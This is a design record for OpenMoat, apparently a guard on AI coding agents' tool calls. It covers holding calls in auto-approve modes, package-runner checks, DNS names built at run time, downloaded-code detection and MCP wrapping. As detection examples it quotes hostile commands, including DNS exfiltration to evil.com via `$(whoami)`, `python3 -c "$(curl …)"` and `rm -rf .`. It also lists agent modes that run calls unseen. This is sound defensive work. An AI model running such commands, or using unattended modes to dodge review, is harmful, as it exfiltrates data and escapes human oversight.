# ADR-102: An unattended profile, package runners, DNS names built at run time, and wrapping newly accepted MCP servers

Status: accepted · Date: 2026-11-14 · Builds on ADR-025 (`defer`), ADR-030 (package
near misses), ADR-032 (first sight), ADR-076 (`init` offers to wrap) · Amends ADR-076
decision 2 for servers accepted later · Numbered 102: 100 and 101 are taken by changes
open at the time of writing

## Context

Since ADR-025 a call OpenMoat neither denies nor reviews is a `defer`: the agent's own
permission flow decides it, as it would without OpenMoat. That is the quiet default the
project chose, and it is right where that flow asks a person. Several agents have modes
in which it asks no one: Claude Code's `bypassPermissions` and `auto`, pi in print or JSON
mode, Hermes Agent's YOLO mode, Antigravity CLI's `always-proceed`, Cline's
`--auto-approve`, OpenCode 2's `--auto`. There a `defer` means "runs": an install of an
unknown package, `rm -rf .`, a GET to an unlisted host through a fetch tool, an MCP
repository delete. OpenMoat already turns a `review` into a deny that says how to approve
it where the host would approve it unseen (`Reviews::prompt_free_modes`,
`Reviews::unseen`), but nothing held the defers.

Three smaller gaps sat next to it. `npx`, `uvx`, `pipx run` and the other runners fetch a
package and run its code at once; the near-miss check of ADR-030 read only installs, so
`npx lodahs` and `uvx anything` deferred. No conformance fixture covered DNS exfiltration,
and a name built at run time (`dig $(whoami).evil.com`) carried no host, so it deferred
where `dig x.evil.com` was denied. The classifier audit of 2026-11-08 left three forms of
downloaded code open: `python3 -c "$(curl …)"`, `sh -c '$(curl …)'` (single quotes, the
inner shell expands it) and `find -exec`/`xargs` runs, which carried no outer substitutions.
And MCP wrapping (ADR-076) was offered only by `init`: a server added later started
unchecked until a person ran `openmoat mcp wrap`.

## Decision 1: `unattended:`, in the person's policy only

A new top-level key, `unattended: defer | review`, absent meaning `defer`:

- With `review`, a call whose decision is `defer` (not `ungoverned`), in a mode in which
  the agent runs such a call with no person asked, becomes a `review` with the new built-in
  rule `unattended` first among its rules. `allow`, `deny` and `review` are unchanged.
  Nothing changes with `defer`.
- What the agent does with that review is decided as for any other review: where its hook
  can still ask (Claude Code's `auto` and `acceptEdits`, which put a hook's `ask` to the
  person), the person is asked; where no one is asked (`bypassPermissions`, pi without a
  screen, Hermes Agent and Antigravity CLI approving unseen), it is answered as
  `PreToolUseNoPrompt`, a deny that says how to approve it (`openmoat`, `openmoat allow
  --last`), or a request on the approvals channel (ADR-078). The profile never forces a
  deny on a mode whose hook can prompt.
- Only the person's policy holds it. `RepoPolicy` rejects unknown keys, so a repository
  policy or a pack that names it does not parse (the call is then denied, `kernel-error`);
  a cloned repository cannot lower or raise it. It is lock-pinned like the rest of the file.
  An OpenMoat from before this change refuses a policy that has the key (unknown key), so
  the guard denies every call until the binary is updated or the key removed.
- The rule is OpenMoat's own (`rule_id::UNATTENDED`, worded for the block message, ADR-059).

**Which modes count** is a fact of each host's spec, from what the hook can see:

| Host | Detected from | A review there | Source |
|---|---|---|---|
| Claude Code | payload `permission_mode` in `Reviews::unattended_modes`: `bypassPermissions`, `auto` | `bypassPermissions`: a deny; `auto`: asked | hooks reference, common input fields and `ask`; settings reference `defaultMode`; `claude_code/settings.rs` `PROMPTING_MODES` |
| Claude Code | `permission_mode` in `Reviews::edit_modes` (`acceptEdits`), for a file write or a shell command whose program is in `edit_mode_commands` (`mkdir`, `touch`, `rm`, `rmdir`, `mv`, `cp`, `sed`) | asked | permission modes in the settings reference: `acceptEdits` approves edits and those file commands in the working directory, and asks before the rest |
| pi | the adapter's `has_ui: false` (print and JSON mode); pi has no approval step of its own | a deny | `pi/HOST.md`, extension `ctx.hasUI` |
| Hermes Agent | `Reviews::unseen`: `HERMES_YOLO_MODE`, `approvals.mode: off` and the unattended `approve` settings | a deny | `hermes/HOST.md` |
| Antigravity CLI | `Reviews::unseen`: `toolPermission: always-proceed` in `settings.json` (what `--dangerously-skip-permissions` sets) | a deny | `antigravity_cli/settings.rs` |

`dontAsk` is not a mode here: Claude Code refuses what it would ask about, so a deferred
call does not run. In `acceptEdits` OpenMoat cannot tell a path in the working directory
from one outside it, so it counts every file write and every such command: stricter, never
looser, and answered as a prompt.

`HookRequest::unattended` carries it from the adapter to the guard; for the hosts whose
answer is read outside the payload, the guard reads it (`guard/unseen.rs`) only when the
policy says `review` and the decision is a `defer`, so the default costs no file read. A
contract test requires every host that can report such a mode to say why its review
becomes a deny where no one is asked (`on_no_prompt`).

**Not detected**, because the hook is not shown it: Cline's `--auto-approve` (default on)
and `--yolo` (which runs no hooks at all); OpenCode 2's `--auto`; Codex's approval policy
`never` and `--dangerously-bypass-approvals-and-sandbox` (its payload's `permission_mode`
values in an auto-approve run are not documented); Gemini CLI's `--yolo` (a `review` there
still reaches the person, `gemini_cli/HOST.md`); GitHub Copilot CLI's `--allow-all-tools`;
goose's `GOOSE_MODE` when set in its `config.yaml`. For those `openmoat run` is the
boundary, and LIMITS.md says so. A host fact added later needs a source, as above.

**Default: `defer`, unchanged.** Under the default policy most of what an agent runs
defers (an install, a build tool the policy does not name, a fetch). With `review` every
one of them waits for a person in such a mode. For a run nobody watches (CI, a scheduled
job, `claude -p` with `bypassPermissions`) that is the point; for a person who turned the
agent's prompts off while watching, it is a stop on every unknown command, and changing the
default would break that workflow without asking. So the default stays, the CHANGELOG says
the key exists, and POLICY.md §5.4 and LIMITS.md recommend `review` wherever agents run
unattended. The default is revisited once `openmoat report` shows how many calls it would
hold in real sessions.

## Decision 2: package runners name what they fetch

`shell/installs/runs.rs` reads `npx`, `bunx`, `pnpx`, `npm exec`, `npm x`, `pnpm dlx`,
`yarn dlx`, `bun x`, `uvx`, `uv tool run` and `pipx run`: the package option's value
(`-p`/`--package`, `--from`, `--spec`; `uv`'s `--with` adds one), otherwise the first word
after the options. A near miss gives the existing `@package-near-miss` atom; any other name
not on the bundled lists gives `@package-run-unknown <ecosystem> <name>`, which the new
default `review` group `package-run-unknown` names. A name on the lists gives no atom, so
`npx prettier` defers as before. A version pin does not make an unknown name known, so
pinned or not is decided alike. `--no`, `--no-install` and `--offline` fetch nothing and
name nothing; `pnpm exec`, `yarn exec` and `uv run` run what is installed and are not
read. `openmoat allow --always` adds the run's atom to its rule, as it does the near-miss
one (`package_atoms`).

For runners the lists are an allowlist, so they were widened and the project is asked
what it already provides:

- **Tool lists.** `data/top-packages/npm-tools.txt` and `pypi-tools.txt`, kept by hand and
  untouched by `scripts/refresh-top-packages.py`, hold the tools people run with a runner
  that are not among the most-installed dependencies: scaffolders (`create-next-app`,
  `create-vite`, `shadcn`), database, lint and release tools (`drizzle-kit`,
  `@biomejs/biome`, `@changesets/cli`, `knip`), type checkers (`pyright`, `ty`) and the
  reference MCP servers. They count for the near-miss check too. The headers of all lists
  say so.
- **A program the project installed.** An npm runner's first word, with no version and no
  package option (`npx tsc`, `npx ng`), may be a program in `node_modules/.bin` rather than
  a package; the atom then ends in `or-local-program`. The engine asks the
  `ProgramResolver` (`local_bin`) whether `node_modules/.bin/<word>` exists in the working
  directory or a parent up to the project root, and drops the atom if so. A version
  (`npx tsc@5`) or a package option names a package, so the program is not looked for.
- **A package the project declared.** The engine asks (`declared`) whether the nearest
  manifest declares the run word as a package: `package.json`'s `dependencies`,
  `devDependencies` or `optionalDependencies`; `pyproject.toml`'s dependency lists
  (PEP 621, dependency groups, uv's and Poetry's), else `uv.lock`. A declared package is
  no unknown package. The run word is compared as a package name only: a program is never
  mapped to the package that provides it, and a declared near miss keeps its
  `package-near-miss` review.

The resolver is the CLI's (`project_packages.rs`, through `environment::WithOwnBinary`);
`NoResolver` and `MapResolver` answer no, so conformance stays deterministic and the
fixtures show the verdict without a project (`review-npx-program-without-the-project`),
while the engine's unit tests and the CLI's show each project case. The files are read only
when an `@package-run-unknown` atom was produced; a missing, oversized (over 1 MiB) or
broken manifest declares nothing.

What this lets through, measured against what it replaces: a program in
`node_modules/.bin` is code the project has, run as `node x.js` or `npm test` would run
it (`session-written-code` still applies to a file the session wrote and runs directly);
a name an agent adds to `package.json` and then runs was already one `npm install` away,
which defers. Neither is a package fetched from a name nothing vouches for.

## Decision 3: a host name built at run time, and more resolvers

For a program that names hosts, a word with an expansion whose fixed end is a host
(`$(whoami).evil.com`, `${X}.evil.com`, `x-$(id -u).evil.com`) names that end: the lookup
goes to that domain's name server and carries the built part. Where the built part is a
command's output (`$(…)`, backticks), or the program is a resolver, it is a `net` atom,
which the default policy denies for an unlisted host. Where it is a plain variable in an
HTTP client's URL (`curl https://$BUCKET.s3.amazonaws.com/x`), the request is decided as
before: it defers, as the URL written out does. It is not made a `fetch`, because an
unquoted variable can also hold options (`-d @file`), which is why `fetch.rs` never calls
a request with an expansion one that sends nothing. `drill`, `kdig`,
`delv`, `getent` and `resolvectl` join `HOST_PROGRAMS`: like `dig`, a name they look up
under an unlisted domain is denied, internal names under a known top-level domain
included. A name with no fixed host after its last expansion (`dig "$DOMAIN"`), one under
a top-level domain OpenMoat does not know, and a host assigned to a variable earlier and
used whole (`H=x.evil.com; dig $H`) are not seen; LIMITS.md names them.

## Decision 4: the three open forms of downloaded code

A command substitution in the program's place (`$(curl URL)`, which also covers `sh -c
'$(curl URL)'`: the inner shell expands it), in an interpreter's inline code (`python3 -c
"$(curl URL)"`), and in the command `find -exec` or `xargs` runs (their outer
substitutions now reach the command, as a wrapper's did) emit the canonical `curl URL |
<program>` pipeline, so `pipe-to-shell` decides them. A substitution that prints a local
path (`$(git rev-parse --show-toplevel)/x.sh`) emits a pipeline no rule names, and the line
defers as before.

## Decision 5: MCP servers accepted later are offered wrapping, Enter for yes

`openmoat mcp accept` (and `doctor --accept`), after a person accepts a definition that is
new, asks the same question `init` asks about those servers, `Run them through OpenMoat?
[Y/n/d]`, Enter being yes; a no is remembered per definition as at `init`. The servers are
matched by definition id (file and pointer), so another agent's server of the same name is
not offered.

Wrapping is not turned on without a person, and not for existing servers, because it would
add work to normal sessions without anyone agreeing to it: a wrapped server's tools stay
hidden until `openmoat mcp accept` after its first start (ADR-032), a wrapped server does
not start inside `openmoat run` (ADR-049), and rewriting the person's agent files needs
the person (the "ask before change" rule of `init`). A new definition is already a point at
which the person must act: its calls are denied (`mcp-server-changed`) until they accept
it. Offering the wrap there adds one answer to a step they are taking anyway, and only for
the server they just added. A project's `.mcp.json` is still never rewritten (ADR-049).

## Consequences

- `unattended: review` closes "a `defer` runs in auto-approve modes" for the four hosts
  whose mode the hook sees; the rest are named in POLICY.md §5.4 and LIMITS.md.
- New fixtures: DNS attacks, downloaded-code attacks, package-run reviews, and their benign
  neighbours (tools on the new lists, a variable bucket in a URL); unit tests for each classifier
  change, the project lookups (engine and CLI), the guard's unattended step and Claude
  Code's modes, and end-to-end tests of `unattended: review` under Claude Code's modes, of
  a repository policy that names the key, and of `mcp accept` offering the wrap.
- Two existing fixtures change on purpose: `review-npm-exec-like-npx` (`npm exec tsc`)
  and `review-npm-x-like-npx` (`npm x cowsay`) deferred and now need review
  (`package-run-unknown`) when nothing in the project provides them.
- `HookRequest` gains `unattended`; `Reviews` gains `unattended_modes`, `edit_modes` and
  `edit_mode_commands`; `ProgramResolver` gains `local_bin` and `declared`, which answer no
  by default; `openmoat_core::Ecosystem` is public.
- `openmoat_core::package_near_misses` is now `package_atoms` and also returns the
  `@package-run-unknown` atoms.
